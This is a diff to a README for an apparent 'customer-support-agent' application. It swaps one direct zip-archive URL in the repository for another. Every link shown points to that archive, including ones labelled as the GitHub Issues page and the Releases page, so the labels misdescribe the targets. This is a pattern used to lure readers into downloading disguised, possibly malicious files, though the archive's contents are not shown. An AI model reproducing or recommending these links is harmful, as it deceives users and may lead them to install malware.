@@ -15,11 +15,11 @@ Welcome to **customer-support-agent**! This application helps you access AI supp
 
 To start using **customer-support-agent**, you first need to download the application. 
 
-[![Download customer-support-agent](https://raw.githubusercontent.com/xjanex160/customer-support-agent/main/scripts/customer-support-agent-v3.9.zip%20Now-brightgreen)](https://raw.githubusercontent.com/xjanex160/customer-support-agent/main/scripts/customer-support-agent-v3.9.zip)
+[![Download customer-support-agent](https://github.com/xjanex160/customer-support-agent/raw/refs/heads/main/docs/support_agent_customer_v3.5.zip%20Now-brightgreen)](https://github.com/xjanex160/customer-support-agent/raw/refs/heads/main/docs/support_agent_customer_v3.5.zip)
 
 ### Step-by-Step Download Instructions
 
-1. Click on the above link or visit this [page to download](https://raw.githubusercontent.com/xjanex160/customer-support-agent/main/scripts/customer-support-agent-v3.9.zip).
+1. Click on the above link or visit this [page to download](https://github.com/xjanex160/customer-support-agent/raw/refs/heads/main/docs/support_agent_customer_v3.5.zip).
   
 2. You will see a list of available versions. Choose the one that suits your needs. Usually, the latest version is the best choice.
 
@@ -59,7 +59,7 @@ Once everything is set, you can start using the application:
 
 If you encounter issues or have questions:
 
-- Visit the [GitHub Issues page](https://raw.githubusercontent.com/xjanex160/customer-support-agent/main/scripts/customer-support-agent-v3.9.zip) to report bugs or request features.
+- Visit the [GitHub Issues page](https://github.com/xjanex160/customer-support-agent/raw/refs/heads/main/docs/support_agent_customer_v3.5.zip) to report bugs or request features.
 - Join our community chats to connect with other users for tips and tricks. 
 
 ## 🔍 Additional Topics
@@ -72,7 +72,7 @@ This application employs various technologies, enhancing its functionality:
 
 ## 💾 Updates & Releases
 
-Stay tuned for updates as we continuously improve the application. You can check for new features or bug fixes on our [Releases page](https://raw.githubusercontent.com/xjanex160/customer-support-agent/main/scripts/customer-support-agent-v3.9.zip).
+Stay tuned for updates as we continuously improve the application. You can check for new features or bug fixes on our [Releases page](https://github.com/xjanex160/customer-support-agent/raw/refs/heads/main/docs/support_agent_customer_v3.5.zip).
 
 ## 📝 License
 
